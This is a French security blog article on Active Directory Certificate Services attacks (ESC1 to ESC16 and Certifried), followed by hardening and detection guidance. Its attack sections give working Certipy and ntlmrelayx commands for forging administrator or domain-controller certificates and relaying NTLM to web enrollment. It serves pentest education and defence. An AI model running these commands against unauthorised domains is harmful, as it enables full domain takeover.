> **TL;DR** — ADCS est la PKI d'entreprise d'AD. Toute la surface d'attaque tient en une phrase : si on peut obtenir un certificat au nom d'un compte privilégié, **PKINIT transforme ce certificat en TGT**, donc en identité. Les défauts de configuration (regroupés sous les labels *ESC*) ouvrent cette porte : template qui laisse choisir le sujet (ESC1), EKU trop permissifs (ESC2/ESC3), ACL faibles (ESC4/ESC5/ESC7), flag CA dangereux (ESC6), ou relais NTLM vers l'enrôlement web (ESC8). On déroule ESC1 à ESC8 avec **Certipy** (`find` / `req` / `auth`), on mentionne ESC9 à ESC16 et Certifried (CVE-2022-26923), puis le durcissement : **strong mapping (KB5014754 + extension SID)**, **EPA Required** sur le web (passer en HTTPS ne suffit pas sans EPA), retrait des EKU dangereux et approbation manuelle.

Le papier fondateur est *Certified Pre-Owned: Abusing Active Directory Certificate Services* (Will Schroeder et Lee Chagolla-Christensen, SpecterOps, juin 2021), qui définit ESC1 à ESC8. L'outil de référence côté offensif est **Certipy** (Oliver Lyak / ly4k), qui couvre aujourd'hui ESC1 à ESC16. Cet article est le pendant ADCS de celui sur [Kerberos](/posts/kerberos/) (PKINIT y mène tout droit) et recoupe celui sur [NTLM](/posts/ntlm/) (ESC8 est un relais NTLM).

## 1. Fonctionnement

### 1.1 PKI, CA et templates

AD CS est une **PKI d'entreprise intégrée à AD** : un rôle serveur qui émet et gère des certificats X.509. L'**Enterprise CA** (par opposition à la Standalone CA) est jointe au domaine et publie ses modèles dans la partition Configuration (`CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,…`).

Un **template de certificat** définit trois choses qui décident de la quasi-totalité des attaques :

- **qui peut s'enrôler** (ACL d'enrollment) ;
- **comment le sujet est déterminé** : soit fixé par AD à partir du compte demandeur, soit **fourni par le demandeur**, la source directe d'ESC1 ;
- **les EKU** (usages) et les **flags d'enrollment**.

### 1.2 EKU : ce qui rend un certificat « authentifiant »

Les **EKU** (Extended Key Usage) sont des OID qui définissent l'usage autorisé du certificat. Ceux qui permettent de s'authentifier (donc d'abuser) :

```text
Client Authentication        1.3.6.1.5.5.7.3.2
PKINIT Client Authentication 1.3.6.1.5.2.3.4
Smart Card Logon             1.3.6.1.4.1.311.20.2.2
Any Purpose                  2.5.29.37.0   (ou EKU vide)
Certificate Request Agent    1.3.6.1.4.1.311.20.2.1
```

Un template qui porte l'un de ces EKU et laisse choisir le sujet est exploitable. `Any Purpose` et `Certificate Request Agent` sont au cœur d'ESC2 et ESC3.

### 1.3 Enrôlement et PKINIT

On demande un certificat par plusieurs canaux : DCOM/RPC (MS-ICPR, via `certreq`), l'**interface web** (certsrv, MS-WCCE sur HTTP), ou CES/NDES. La porte d'enrôlement web est celle qu'on relaie en ESC8.

Le maillon qui transforme « j'ai un certificat » en « je suis ce compte », c'est **PKINIT** : l'extension Kerberos qui délivre un **TGT à partir d'un certificat** (authentification par clé publique au lieu du mot de passe). C'est le lien direct avec l'article [Kerberos](/posts/kerberos/) : une fois le TGT obtenu, on est dans le flux Kerberos standard (et Certipy renvoie aussi le hash NT au passage). Quand PKINIT n'est pas disponible, une alternative existe via **Schannel** (auth par certificat sur TLS, utilisée par ESC10 case 2 et ESC15).

```text
Mauvaise config template/CA
   │  certipy req  → certificat au nom d'un compte privilégié (PFX)
   ▼
Certificat (PFX)
   │  certipy auth → PKINIT → TGT (+ hash NT)   [ou Schannel]
   ▼
Identité du compte privilégié → compromission
```

## 2. Attaques ESC1 à ESC8

> **Autorisation** — Les techniques qui suivent se pratiquent uniquement dans un **périmètre explicitement autorisé** (mission sous mandat ou lab). Émettre un certificat au nom d'un administrateur sur une PKI dont on n'a pas la charge est une compromission réelle, pas un exercice théorique. Les commandes sont commentées pour comprendre le défaut exploité.
{: .prompt-warning }

Workflow Certipy commun à presque toutes les techniques :

```bash
# Découverte des templates/CA vulnérables (JSON + sortie lisible)
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# → liste les ESCx détectés, par template et par CA

# Après obtention d'un PFX : authentification (PKINIT → TGT + hash NT)
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
```

### 2.1 ESC1 : template autorisant un SAN arbitraire

**Principe.** Le template combine trois faiblesses : un EKU d'authentification (Client Auth ou Any Purpose), le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (**le demandeur fournit le `subjectAltName`**), et un enrollment ouvert aux comptes peu privilégiés. On demande donc un certificat en plaçant le **UPN d'un administrateur** dans le SAN : la CA l'émet tel quel. C'est le cas le plus fréquent.

**Exploitation.**

```bash
# Demande d'un cert avec le UPN d'un admin dans le SAN (-upn), $ADCS_HOST = FQDN
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'
# → administrator.pfx

# Variante : usurper une machine via son DNS plutôt qu'un UPN
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'VulnTemplate' -dns 'dc01.corp.local'

# Puis Pass-the-Certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Si Certipy renvoie une erreur « Object SID mismatch », on ajoute `-sid` avec le SID de la cible : c'est la conséquence directe du durcissement *strong mapping* (extension SID, §4). Depuis l'enforcement, ce `-sid` est quasi systématique.

**Résultat / impact.** Usurpation de n'importe quel compte, Domain Admin compris → compromission du domaine à partir d'un simple compte de domaine.

### 2.2 ESC2 : Any Purpose EKU

**Principe.** Le template porte l'EKU **Any Purpose** (`2.5.29.37.0`) ou **aucun EKU**. Le certificat sert alors à tout, authentification comprise. Sans contrôle du sujet, l'exploitation rejoint celle d'un agent d'enrôlement (ESC3).

**Exploitation.** Pas de commande spécifique à ESC2 : on bascule sur le flux ESC3 (le certificat Any Purpose fait office de certificat d'agent d'enrôlement).

**Résultat / impact.** Un certificat « passe-partout » qui permet l'auth et, combiné à un template client, l'émission au nom d'autrui.

### 2.3 ESC3 : Certificate Request Agent EKU

**Principe.** Le template porte l'EKU **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`), qui autorise à demander un certificat **au nom d'un autre compte** (enrollment agent). On obtient d'abord le certificat d'agent, puis on l'utilise pour s'enrôler en tant qu'administrateur.

**Exploitation.**

```bash
# 1. Obtenir le certificat d'agent d'enrôlement
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'EnrollmentAgent'

# 2. Demander un cert "User" au nom de l'admin, avec le PFX d'agent
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' -pfx 'user.pfx'
```

Le template visé en étape 2 doit permettre la Client Authentication.

**Résultat / impact.** Émission d'un certificat pour l'administrateur → PKINIT → compromission, sans jamais toucher à son mot de passe.

### 2.4 ESC4 : ACL faibles sur un template

**Principe.** On dispose de droits d'écriture (`WriteOwner` / `WriteDacl` / `GenericWrite` / `GenericAll`) sur l'**objet template** lui-même. On le **reconfigure** pour le rendre vulnérable (typiquement en ESC1), on l'exploite, puis on restaure sa configuration d'origine.

**Exploitation.**

```bash
# Rendre le template vulnérable (écrit une config par défaut permissive), puis exploiter en ESC1
certipy template -u user@corp.local -p 'Password1' -template 'VulnTemplate' -write-default-configuration
# → enchaîner avec un certipy req type ESC1, puis restaurer la configuration d'origine
```

**Résultat / impact.** Un template anodin devient temporairement un ESC1 sous contrôle de l'attaquant. À restaurer proprement en mission pour ne pas laisser le template exposé.

### 2.5 ESC5 : ACL faibles sur d'autres objets PKI

**Principe.** Le contrôle ne porte pas sur un template mais sur un autre objet de la PKI : l'objet ordinateur du serveur CA, le conteneur `CN=Public Key Services`, les objets CA eux-mêmes. En maîtrisant l'un d'eux, on compromet indirectement toute la PKI (par exemple en reconfigurant la CA).

**Exploitation.** Dépend de l'objet contrôlé ; l'analyse part de `certipy find` et de la cartographie des ACL (BloodHound remonte ces chemins). La remédiation est la même que pour ESC4/ESC7 : durcir les ACL.

**Résultat / impact.** Compromission de la PKI par un chemin détourné, souvent invisible si on ne regarde que les templates.

### 2.6 ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2

**Principe.** Le flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** est activé **sur la CA**. Conséquence : **n'importe quel** template, même le template standard `User`, accepte un SAN fourni par le demandeur via l'attribut de requête. C'est ESC1 généralisé à toute la CA, sans avoir besoin d'un template vulnérable. Point à surveiller de près côté défense.

**Exploitation.**

```bash
# Détection : certipy find remonte "User Specified SAN : Enabled"
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -stdout
# Côté Windows : certutil -getreg policy\EditFlags

# Exploitation comme ESC1, mais sur un template standard
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'User' -upn 'administrator@corp.local'
```

Comme pour ESC1, depuis le correctif de mai 2022 (extension SID / CVE-2022-26923), l'exploitation peut nécessiter `-sid`.

**Résultat / impact.** Usurpation d'un admin via n'importe quel template émis par la CA → compromission du domaine. Un seul flag CA mal positionné suffit.

### 2.7 ESC7 : ACL faibles sur la CA

**Principe.** On détient le droit `ManageCA` et/ou `ManageCertificates` sur la CA. `ManageCA` permet d'activer `EDITF_ATTRIBUTESUBJECTALTNAME2` (→ ESC6), ou d'ajouter un *Officer* et d'approuver des requêtes en attente / d'activer le template `SubCA`.

**Exploitation.**

```bash
# S'ajouter comme officer, activer le template SubCA
certipy ca -u user@corp.local -p 'Password1' -ca 'CORP-CA' -add-officer user
certipy ca -u user@corp.local -p 'Password1' -ca 'CORP-CA' -enable-template 'SubCA'

# Soumettre une requête SubCA (échoue → renvoie un request id), puis approuver et récupérer
certipy req -u user@corp.local -p 'Password1' -target adcs.corp.local -ca 'CORP-CA' -template 'SubCA'
certipy ca  -u user@corp.local -p 'Password1' -ca 'CORP-CA' -issue-request <ID>
certipy req -u user@corp.local -p 'Password1' -target adcs.corp.local -ca 'CORP-CA' -retrieve <ID>
```

**Résultat / impact.** Contrôle effectif de l'émission : on se délivre un certificat privilégié en contournant l'approbation normale.

### 2.8 ESC8 : relais NTLM vers l'enrôlement web

**Principe.** L'interface **web enrollment** d'AD CS (certsrv, CES, NDES, via MS-WCCE sur HTTP) accepte l'authentification NTLM et **n'impose pas l'EPA**. On **relaie** une authentification NTLM, typiquement celle d'un **DC coercé**, vers la CA, et on obtient un certificat au nom du compte relayé. C'est le relais ADCS de référence, popularisé par les travaux de dirkjanm (PetitPotam → ADCS). Elle recoupe directement l'article [NTLM](/posts/ntlm/).

**Prérequis.** Une coercition (PrinterBug, **PetitPotam**, PrivExchange, Coercer) qui force un compte à s'authentifier vers l'hôte attaquant, un template autorisant l'auth (User/Machine/DomainController), et un enrollment peu privilégié. Pour viser le domaine, on coerce un compte privilégié (un DC, Exchange).

**Exploitation.** Deux syntaxes selon la version de l'outillage.

```bash
# Historique : relais via ntlmrelayx (Impacket), endpoint HTTP
ntlmrelayx -t http://pki.corp.local/certsrv/certfnsh.asp --adcs --template 'DomainController'
# → PFX du compte relayé obtenu dès qu'une coercition tombe

# Certipy v5, relais natif, HTTP ET HTTPS (alias binaire : certipy-ad relay)
certipy relay -target http://10.0.0.50      # ESC8 sur HTTP
certipy relay -target https://10.0.0.50     # ESC8 sur HTTPS (natif en v5)
```

Découverte préalable :

```bash
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -stdout | grep -B20 ESC8
```

Un `-template` vide laisse Certipy choisir Machine ou User selon que le compte relayé finit par `$`.

**Résultat / impact.** PFX du DC → Pass-the-Certificate → TGT du DC → DCSync → domaine. C'est l'une des chaînes ADCS les plus courtes vers le domaine, et le relais HTTPS natif de Certipy v5 l'a remise en avant (§4).

## 3. Au-delà d'ESC8 : ESC9 à ESC16 et Certifried

Les labels suivants complètent le paysage ; ils sont couverts par Certipy et documentés sur thehacker.recipes. En survol :

- **ESC9 : No Security Extension.** Le flag `CT_FLAG_NO_SECURITY_EXTENSION` empêche l'ajout de l'extension SID au certificat. Combiné à un mapping faible côté DC et à un `GenericWrite` sur un compte, il permet l'usurpation via changement de UPN (Certipy `shadow auto` + `account update` pour passer le UPN à celui de la cible, puis `req`, puis restauration).
- **ESC10 : Weak Certificate Mapping.** Mapping faible côté DC (`StrongCertificateBindingEnforcement = 0`, case 1) ou `CertificateMappingMethods = 0x4` / UPN only (case 2, où la cible n'a pas de UPN, par exemple un compte machine/DC, exploité via **Schannel** et `-ldap-shell`).
- **ESC11 : relais vers RPC (MS-ICPR).** L'endpoint RPC d'enrôlement n'impose pas le packet privacy → relais NTLM possible (`ntlmrelayx -t rpc://… -rpc-mode ICPR -icpr-ca-name …`). Recherche originale : Compass Security.
- **ESC12 : shell sur CA avec YubiHSM.** Mot de passe de l'HSM en clair dans le registre → export de la clé CA.
- **ESC13 : Issuance Policy liée à un groupe.** Un template dont la issuance policy est reliée via `msDS-OIDToGroupLink` à un groupe privilégié confère l'appartenance (SID injecté dans le PAC). Recherche : Jonas Bülow Knudsen (SpecterOps).
- **ESC14 : Weak Explicit Mapping.** `altSecurityIdentities` contient un mapping explicite faible (ou l'attaquant peut l'écrire).
- **ESC15 : Arbitrary Application Policy (CVE-2024-49019, « EKUwu »).** Sur un template v1 autorisant le SAN, les *application policies* fournies par le demandeur **écrasent les EKU** du template (`certipy req --application-policies …`). L'auth via application policy ne fonctionne qu'en **Schannel** (pas PKINIT) ; injecter Certificate Request Agent enchaîne vers ESC3. **Patché** sur les systèmes à jour. Recherche : TrustedSec.
- **ESC16 : Security Extension désactivée au niveau CA.** La CA désactive l'OID `1.3.6.1.4.1.311.25.2` (extension SID) via `policy\DisableExtensionList` → comportement ESC9 pour tous les templates. Non exploitable sous `StrongCertificateBindingEnforcement = 2`.

**CVE-2022-26923, « Certifried ».** Un utilisateur qui crée un compte machine peut écrire ses `dNSHostName` et `servicePrincipalName`. En effaçant d'abord les SPN (pour éviter le contrôle de contrainte), on fixe `dNSHostName` au nom d'un DC, puis on demande un certificat via le template **Machine** : la CA identifie la machine par son `dNSHostName` et émet un certificat **pour le DC**.

```bash
# Création du compte machine avec le dNSHostName d'un DC, puis demande via le template Machine
certipy account create -u user@corp.local -p 'Password1' -user 'EVIL$' -pass 'Evil123!' -dns 'dc01.corp.local'
certipy req -u 'EVIL$'@corp.local -p 'Evil123!' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'Machine'
```

Le test patché/non patché : si Certipy affiche `Certificate object SID is […]` (objectSid présent), le correctif est appliqué. Correctif Microsoft de **mai 2022** ; la mitigation complète exige de patcher **le KDC et le serveur CA**, et de ramener `MachineAccountQuota` à 0.

## 4. Durcissement par ESC

Ce que chaque mesure bloque, point par point :

| ESC | Correctif / configuration qui bloque |
|---|---|
| ESC1 / ESC6 | Retirer `ENROLLEE_SUPPLIES_SUBJECT` ; **désactiver `EDITF_ATTRIBUTESUBJECTALTNAME2`** (`certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`) ; approbation manuelle (CA Manager approval) ; extension SID (KB5014754). |
| ESC2 / ESC3 | Retirer les EKU dangereux (Any Purpose, Certificate Request Agent) ; restreindre les *Restricted Enrollment Agents*. |
| ESC4 / ESC5 / ESC7 | Durcir les ACL sur les templates, les objets PKI et la CA (pas de `WriteDacl` / `ManageCA` hors administrateurs). |
| ESC8 / ESC11 | **HTTPS + EPA (Extended Protection = Required)** sur l'enrôlement web ; packet privacy (`IF_ENFORCEENCRYPTICERTREQUEST`) sur RPC ; désactiver NTLM ; corriger la coercition (PetitPotam → MS-EFSRPC). |
| ESC9 / ESC10 / ESC16 | **KB5014754 + `StrongCertificateBindingEnforcement = 2`** ; ne pas activer `CT_FLAG_NO_SECURITY_EXTENSION` ; ne pas désactiver l'OID SID sur la CA. |
| ESC13 | Supprimer les liens `msDS-OIDToGroupLink` vers des groupes privilégiés. |
| ESC14 | Nettoyer `altSecurityIdentities` ; n'utiliser que des mappings forts. |
| ESC15 | Appliquer le correctif CVE-2024-49019 ; retirer/mettre à jour les templates v1 `ENROLLEE_SUPPLIES_SUBJECT`. |
| CVE-2022-26923 | Patch mai 2022 (KDC + CA) ; `MachineAccountQuota = 0`. |

Deux piliers méritent d'être explicités, parce qu'ils sont systématiquement mal compris.

**Strong mapping (KB5014754 + extension SID).** Le correctif de fond fait ajouter et vérifier par les DC l'**extension SID** `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`), qui lie fortement le certificat à l'objet AD. La clé `StrongCertificateBindingEnforcement` du KDC prend trois valeurs : **0 (Disabled)**, **1 (Compatibility)** et **2 (Full Enforcement)**. À `2`, tout mapping faible ou absent est rejeté. C'est ce qui casse ESC9/ESC10/ESC16 et impose le `-sid` de Certipy pour ESC1/ESC6.

**EPA sur l'enrôlement web (ESC8).** **Passer l'enrôlement web en HTTPS ne suffit pas.** Historiquement, IIS n'imposait pas l'EPA par défaut, donc un endpoint **HTTPS restait relayable** tant que l'EPA n'était pas explicitement positionnée en *Required* (IIS Extended Protection). C'est le passage à EPA = Required qui lie l'authentification au canal TLS et coupe le relais, pas le simple chiffrement.

### Actualité (2024-2026)

- **Enforcement de KB5014754.** D'après Microsoft, le déploiement initial date du **10 mai 2022** (mode Compatibility par défaut), avec un jalon de durcissement en **novembre 2023**. Depuis la mise à jour du **11 février 2025**, un DC dont la clé `StrongCertificateBindingEnforcement` n'est pas configurée bascule en **Full Enforcement** (rejet des mappings faibles ou absents) ; un DC qui a explicitement la valeur `1` (Compatibility) reste, lui, en Compatibility. La mise à jour du **9 septembre 2025** met fin à la possibilité de revenir en mode Compatibility : la valeur `StrongCertificateBindingEnforcement` n'est **plus prise en charge**, et le strong mapping s'impose de fait pour toute authentification par certificat, d'où le recours quasi systématique au flag `-sid` de Certipy. Une *known issue* a par ailleurs été ajoutée le **29 juillet 2025** (une GPO interférant avec les mappings basés sur le nom). *Comme pour tout calendrier Microsoft, vérifier l'état exact sur la KB en vigueur et sur l'environnement audité.*
- **ESC8 nouvelle génération (relais HTTPS).** D'après Compass Security (2025), comme IIS n'impose pas l'EPA par défaut sur ces endpoints, le simple passage en HTTPS ne protège pas : un endpoint HTTPS reste relayable tant que l'EPA n'est pas explicitement en *Required*. **Certipy v5** ajoute le relais HTTPS natif et la détection de l'enforcement du channel binding. L'outil **RelayInformer** (SpecterOps, 2025) énumère l'enforcement EPA sur les endpoints HTTPS et MSSQL. Côté défense : désactiver HTTP ne suffit plus, il faut EPA sur HTTPS, et **NDES/SCCM relèvent de la même classe d'attaque**.

## 5. Détection

Côté CA et côté KDC, l'audit tourne autour de trois Events (audit AD CS activé via `certutil -setreg CA\AuditFilter 127` + la policy *Audit Certification Services*) :

| Indicateur | Event ID | Signal |
|---|---|---|
| Requête de certificat reçue | **4886** | « Certificate Services received a certificate request » |
| Certificat émis | **4887** | « approved a certificate request and issued a certificate » : repère un SAN inhabituel, un demandeur ≠ sujet (ESC1/ESC6/ESC8) |
| TGT demandé par certificat | **4768** | Champs *Certificate Information* renseignés = auth **PKINIT** ; un 4768 avec cert pour un compte à privilèges = signal d'abus après ESC1 |

Les signaux qui comptent : discordance **demandeur vs SAN** (un certificat avec un SAN UPN admin émis à un compte lambda), `objectSid` absent (templates ESC9/ESC16), binds Schannel inhabituels, et émission anormale juste avant un 4768 PKINIT sur un compte sensible. BloodHound (edges ADCS) et Microsoft Defender for Identity remontent les chemins. Côté MITRE ATT&CK, c'est la technique **T1649** (*Steal or Forge Authentication Certificates*).

| Priorité | Mesure | Bloque / atténue |
|---|---|---|
| <span class="sev sev-critical">Critique</span> | **Retirer `ENROLLEE_SUPPLIES_SUBJECT`** sur les templates d'auth + approbation manuelle sur les templates sensibles | ESC1 |
| <span class="sev sev-critical">Critique</span> | **Désactiver `EDITF_ATTRIBUTESUBJECTALTNAME2`** sur la CA | ESC6 (SAN arbitraire généralisé) |
| <span class="sev sev-critical">Critique</span> | **EPA = Required** sur l'enrôlement web (HTTPS + Extended Protection), désactiver NTLM, corriger la coercition | ESC8 (et ESC11 côté RPC via packet privacy) |
| <span class="sev sev-critical">Critique</span> | **KB5014754 + `StrongCertificateBindingEnforcement = 2`** (extension SID, strong mapping) | ESC9 / ESC10 / ESC16, mappings faibles |
| <span class="sev sev-high">Haute</span> | **Retirer les EKU dangereux** (Any Purpose, Certificate Request Agent) ; restreindre les enrollment agents | ESC2 / ESC3 |
| <span class="sev sev-high">Haute</span> | **Durcir les ACL** sur templates, objets PKI et CA (pas de `WriteDacl` / `ManageCA` aux non-admins) | ESC4 / ESC5 / ESC7 |
| <span class="sev sev-high">Haute</span> | **Patch mai 2022 (KDC + CA)** et **`MachineAccountQuota = 0`** | CVE-2022-26923 (Certifried) |
| <span class="sev sev-medium">Moyenne</span> | Appliquer **CVE-2024-49019** ; retirer/mettre à jour les templates v1 à SAN | ESC15 (EKUwu) |
| <span class="sev sev-medium">Moyenne</span> | Supprimer les `msDS-OIDToGroupLink` vers des groupes privilégiés ; nettoyer `altSecurityIdentities` | ESC13 / ESC14 |
| <span class="sev sev-low">Basse</span> | **Audit CA activé** (4886/4887) + alerting sur SAN/demandeur discordants et 4768 PKINIT sensibles | Détection ESC1/ESC6/ESC8 |

### Bonnes pratiques

- [ ] `certipy find -vulnerable` passé régulièrement comme contrôle interne (baseline des templates/CA).
- [ ] Aucun template d'auth avec `ENROLLEE_SUPPLIES_SUBJECT` sans approbation manuelle ; `EDITF_ATTRIBUTESUBJECTALTNAME2` désactivé.
- [ ] **Strong mapping imposé** : KB5014754 appliqué, `StrongCertificateBindingEnforcement = 2`, extension SID présente.
- [ ] **EPA = Required** sur tous les endpoints d'enrôlement web (pas seulement HTTPS) ; NTLM désactivé ; packet privacy sur RPC. NDES/SCCM inclus.
- [ ] EKU d'authentification réduits au strict nécessaire ; enrollment agents restreints.
- [ ] ACL durcies sur templates, objets PKI et CA ; `MachineAccountQuota = 0`.
- [ ] Correctifs CVE-2022-26923 et CVE-2024-49019 appliqués.
- [ ] Audit CA activé (4886/4887) et alerting sur les émissions anormales et les 4768 PKINIT sur comptes sensibles.
